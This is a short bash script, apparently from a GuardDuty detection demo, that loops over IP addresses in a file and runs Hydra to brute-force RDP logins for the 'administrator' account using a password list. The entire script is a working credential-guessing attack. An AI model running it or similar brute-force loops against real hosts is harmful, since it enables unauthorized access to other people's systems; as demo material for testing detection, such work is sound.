#!/bin/bash
echo "Running RDP Bruteforce"
rm -rf hydra.restore
filename='/tools/ips.txt'
filelines=`cat $filename`
echo Start
for ip in $filelines ; do
        /tools/hydra/hydra -q -t 4 -f -l administrator -P /tools/guardduty-demos/fake/passwords.txt rdp://$ip >> /var/log/bruteforce-rdp &
        echo "/tools/hydra/hydra -q -t 4 -f -l administrator -P ./fake/passwords.txt rdp://$ip"
done
